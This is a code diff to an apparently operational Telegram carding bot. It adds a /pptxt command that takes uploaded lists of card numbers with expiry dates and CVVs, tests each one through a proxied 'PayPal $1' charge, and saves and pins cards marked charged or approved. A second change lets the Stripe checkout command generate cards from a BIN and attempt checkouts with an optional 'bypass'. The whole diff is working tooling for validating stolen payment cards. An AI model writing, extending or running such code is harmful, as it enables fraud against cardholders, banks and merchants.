+    can_access, access_type = await can_use(event.sender_id, event.chat)
+    if access_type == "banned": return await event.reply(banned_user_message())
+    if not can_access:
+        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+9prhieUj5lI2NTFl")]]
+        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙧𝙚𝙫𝟯𝙧𝙨𝙚𝙭", buttons=buttons)
+
+    proxy_data = await get_user_proxy(event.sender_id)
+    if not proxy_data:
+        return await event.reply("⚠️ 𝙋𝙧𝙤𝙭𝙮 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙙!\n\n𝙋𝙡𝙚𝙖𝙨𝙚 𝙖𝙙𝙙 𝙖 𝙥𝙧𝙤𝙭𝙮 𝙛𝙞𝙧𝙨𝙩 𝙪𝙨𝙞𝙣𝙜:\n`/addpxy ip:port:username:password`\n\n𝙊𝙧 𝙬𝙞𝙩𝙝𝙤𝙪𝙩 𝙖𝙪𝙩𝙝:\n`/addpxy ip:port`")
+
+    user_id = event.sender_id
+    if user_id in ACTIVE_PPTXT_PROCESSES: return await event.reply("```𝙔𝙤𝙪𝙧 𝘾𝘾 is 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝙬𝙖𝙞𝙩 𝙛𝙤𝙧 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙚```")
+    try:
+        if not event.reply_to_msg_id: return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙥𝙥𝙩𝙭𝙩```")
+        replied_msg = await event.get_reply_message()
+        if not replied_msg or not replied_msg.document: return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙥𝙥𝙩𝙭𝙩```")
+        file_path = await replied_msg.download_media()
+        try:
+            async with aiofiles.open(file_path, "r") as f: lines = (await f.read()).splitlines()
+            os.remove(file_path)
+        except Exception as e:
+            try: os.remove(file_path)
+            except: pass
+            return await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧 𝙧𝙚𝙖𝙙𝙞𝙣𝙜 𝙛𝙞𝙡𝙚: {e}")
+        cards = [line for line in lines if re.match(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', line)]
+        if not cards: return await event.reply("𝘼𝙣𝙮 𝙑𝙖𝙡𝙞𝙙 𝘾𝘾 𝙣𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🥲")
+        cc_limit = get_cc_limit(access_type, user_id)
+        total_cards_found = len(cards)
+        if len(cards) > cc_limit:
+            cards = cards[:cc_limit]
+            await event.reply(f"""```📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
+⚠️ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 {cc_limit} 𝘾𝘾𝙨 (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩)
+🔥 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙```""")
+        else: await event.reply(f"""```📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝙫𝙖𝙡𝙞𝙙 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
+🔥 𝘼𝙡𝙡 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙```""")
+
+        ip = proxy_data.get('ip')
+        port = proxy_data.get('port')
+        puser = proxy_data.get('username')
+        ppass = proxy_data.get('password')
+        proxy_str = f"{ip}:{port}:{puser}:{ppass}" if puser and ppass else f"{ip}:{port}"
+
+        ACTIVE_PPTXT_PROCESSES[user_id] = True
+        asyncio.create_task(process_pptxt_cards(event, cards, proxy_str))
+    except Exception as e:
+        ACTIVE_PPTXT_PROCESSES.pop(user_id, None)
+        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")
+
+
+async def process_pptxt_cards(event, cards, proxy_str):
+    try:
+        sender = await event.get_sender()
+        username = sender.username if sender.username else f"user_{event.sender_id}"
+    except:
+        username = f"user_{event.sender_id}"
+
+    user_id = event.sender_id
+    total = len(cards)
+    checked, approved, charged, declined = 0, 0, 0, 0
+    status_msg = await event.reply(f"```𝙎𝙤మె𝙩𝙝𝙞𝙣𝙜 𝘽𝙞𝙜 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳```")
+
+    try:
+        for i, card in enumerate(cards):
+            if user_id not in ACTIVE_PPTXT_PROCESSES:
+                final_caption = f"""⛔ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙎𝙩𝙤𝙥𝙥𝙚𝙙!
+𝙏𝙤𝙩𝙖𝙡 𝘾𝙃𝘼𝙍𝙂𝙀 💎 : {charged}
+𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 🔥 : {approved}
+𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ❌ : {declined}
+𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ☠️ : {checked}/{total}
+"""
+                final_buttons = [[Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")], [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")], [Button.inline(f"𝙎𝙩𝙤𝙥 ➜ [{checked}/{total}] ⛔", b"none")]]
+                try: await status_msg.edit(final_caption, buttons=final_buttons)
+                except: pass
+                return
+
+            start_time = time.time()
+            result = await pp_check_card(card, proxy_str)
+            end_time = time.time()
+            elapsed_time = round(end_time - start_time, 2)
+            checked += 1
+
+            brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
+            should_send_message = False
+
+            s = result["status"]
+            if s == "CHARGED":
+                charged += 1
+                status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
+                await save_approved_card(card, "CHARGED", result["msg"], "PayPal $1", "$1.00")
+                should_send_message = True
+            elif s in ("APPROVED", "LIVE"):
+                approved += 1
+                status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
+                await save_approved_card(card, "APPROVED", result["msg"], "PayPal $1", "$1.00")
+                should_send_message = True
+            else:
+                declined += 1
+                status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
+
+            if should_send_message:
+                card_msg = f"""{status_header}
+
+𝗖𝗖 ⇾ `{card}`
+𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ PayPal $1
+𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {result["msg"]}
+𝗣𝗿𝗶𝗰𝗲 ⇾ $1.00 💸
+
+```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
+𝗕𝗮𝗻𝗸: {bank}
+𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```
+
+𝗧𝗼𝗼𝙠 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝙨
+"""
+                result_msg = await event.reply(card_msg)
+                if s == "CHARGED":
+                    await pin_charged_message(event, result_msg)
+
+            buttons = [
+                [Button.inline(f"𝗖𝗮𝗿𝗱 ➜ {card[:12]}****", b"none")],
+                [Button.inline(f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {result['msg'][:25]}...", b"none")],
+                [Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")],
+                [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")],
+                [Button.inline(f"𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ➜ [ {declined} ] ❌", b"none")],
+                [Button.inline(f"𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ➜ [{checked}/{total}] ✅", b"none")],
+                [Button.inline("⛔ 𝙎𝙩𝙤𝙥", f"stop_pptxt:{user_id}".encode())]
+            ]
+            try: await status_msg.edit("```𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝘾𝘾𝙨 𝙊𝙣𝙚 𝙗𝙮 𝙊𝙣𝙚...```", buttons=buttons)
+            except: pass
+            await asyncio.sleep(0.1)
+
+        final_caption = f"""✅ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!
+𝙏𝙤𝙩𝙖𝙡 𝘾𝙃𝘼𝙍𝙂𝙀 💎 : {charged}
+𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 🔥 : {approved}
+𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ❌ : {declined}
+𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ☠️ : {total}
+"""
+        final_buttons = [[Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")], [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")], [Button.inline(f"𝙏𝙤𝙩𝙖𝙡 ➜ [{total}] ☠️", b"none")], [Button.inline(f"𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ➜ [{checked}/{total}] ✅", b"none")]]
+        try: await status_msg.edit(final_caption, buttons=final_buttons)
+        except: pass
+    finally: ACTIVE_PPTXT_PROCESSES.pop(user_id, None)
+
+
+@client.on(events.CallbackQuery(pattern=rb"stop_pptxt:(\d+)"))
+async def stop_pptxt_callback(event):
+    try:
+        match = event.pattern_match
+        process_user_id = int(match.group(1).decode())
+        clicking_user_id = event.sender_id
+        can_stop = False
+        if clicking_user_id == process_user_id: can_stop = True
+        elif clicking_user_id in ADMIN_ID: can_stop = True
+        if not can_stop: return await event.answer("```❌ 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙤𝙣𝙡𝙮 𝙨𝙩𝙤𝙥 𝙮𝙤𝙪𝙧 𝙤𝙬𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨!```", alert=True)
+        if process_user_id not in ACTIVE_PPTXT_PROCESSES: return await event.answer("```❌ 𝙉𝙤 𝙖𝙘𝙩𝙞𝙫𝙚 𝙥𝙧𝙤𝙘𝙚𝙨𝙨 𝙛𝙤𝙪𝙣𝙙!```", alert=True)
+        ACTIVE_PPTXT_PROCESSES.pop(process_user_id, None)
+        await event.answer("```⛔ 𝘾𝘾 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙨𝙩𝙤𝙥𝙥𝙚𝙙!```", alert=True)
+    except Exception as e: await event.answer(f"```❌ 𝙀𝙧𝙧𝙤𝙧: {str(e)}```", alert=True)
+
+
 # --- Stripe Checkout Functions ---
 
 CO_HEADERS = {
@@ -4713,6 +5352,7 @@ async def co_handler(event):
             "<blockquote><code>𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁</code></blockquote>\n\n"
             "<blockquote>「❃」 𝗣𝗮𝗿𝘀𝗲 : <code>/co `url`</code>\n"
             "「❃」 𝗖𝗵𝗮𝗿𝗴𝗲 : <code>/co `url` cc|mm|yy|cvv</code>\n"
+            "「❃」 𝗕𝗜𝗡 : <code>/co `url` BIN (gen 10 cards)</code>\n"
             "「❃」 𝗕𝘆𝗽𝗮𝘀𝘀 : <code>/co yes `url` cc|mm|yy|cvv</code>\n"
             "「❃」 𝗥𝗲𝗽𝗹𝘆 : <code>Reply to link with /co cc|mm|yy|cvv</code>\n"
             "「❃」 𝗙𝗶𝗹𝗲 : <code>Reply to .txt with /co `url`</code></blockquote>",
@@ -4773,6 +5413,8 @@ async def co_handler(event):
         return
 
     # Parse cards and bypass from command
+    bin_gen_mode = False
+    bin_input_used = None
     if not event.reply_to_msg_id:
         if len(first_line_args) > 2:
             if first_line_args[2].lower() in ['yes', 'no']:
@@ -4786,8 +5428,35 @@ async def co_handler(event):
             remaining_text = '\n'.join(lines[1:])
             cards.extend(parse_co_cards(remaining_text))
 
+    if not cards and not event.reply_to_msg_id:
+        potential_bin = None
+        if len(first_line_args) > 2:
+            potential_bin = first_line_args[-1]
+        elif len(lines) > 1:
+            potential_bin = lines[-1].strip()
+        if potential_bin:
+            bin_clean = potential_bin.replace("|", "").replace("x", "").replace("X", "")
+            if len(bin_clean) >= 6 and bin_clean[:6].isdigit():
+                gen_count = 10
+                gen_cards_raw, gen_info = await generate_cards_api(potential_bin, gen_count)
+                if gen_cards_raw:
+                    for gc in gen_cards_raw:
+                        parsed = parse_co_card(gc)
+                        if parsed:
+                            cards.append(parsed)
+                    if cards:
+                        bin_gen_mode = True
+                        bin_input_used = potential_bin
+                        await event.reply(
+                            f"<b>Generated {len(cards)} cards from BIN <code>{potential_bin}</code></b>\n"
+                            f"<b>Limit: {gen_count} | Checkouting now...</b>",
+                            parse_mode='html'
+                        )
+
     # Apply card limits
     max_cards = 50 if is_premium else 20
+    if bin_gen_mode:
+        max_cards = 10
     if len(cards) > max_cards:
         cards = cards[:max_cards]
         await event.reply(f"⚠️ <b>Card limit exceeded. Only checking first {max_cards} cards.</b>", parse_mode='html')
